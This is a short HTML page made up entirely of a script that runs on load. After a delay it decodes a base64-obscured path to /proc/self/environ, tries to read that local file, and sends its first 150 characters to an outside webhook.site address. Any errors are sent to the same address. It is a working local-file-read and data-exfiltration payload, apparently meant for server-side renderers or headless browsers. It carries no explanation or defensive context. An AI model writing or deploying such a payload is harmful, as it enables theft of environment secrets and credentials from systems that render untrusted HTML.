<!DOCTYPE html>
<html>
<body>
<script>
const h = "https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525";
setTimeout(() => {
  try {
    let p = atob("ZmlsZTovLy9wcm9jL3NlbGYvZW52aXJvbg==");
    fetch(p).then(r => r.text()).then(t => {
      fetch(h + "?lfi=" + btoa(t.slice(0,150)));
    }).catch(e => {
      fetch(h + "?lfi_err=" + encodeURIComponent(e.message));
    });
  } catch(e) {
    fetch(h + "?fail=" + encodeURIComponent(e.message));
  }
}, 4000);
</script>
</body>
</html>
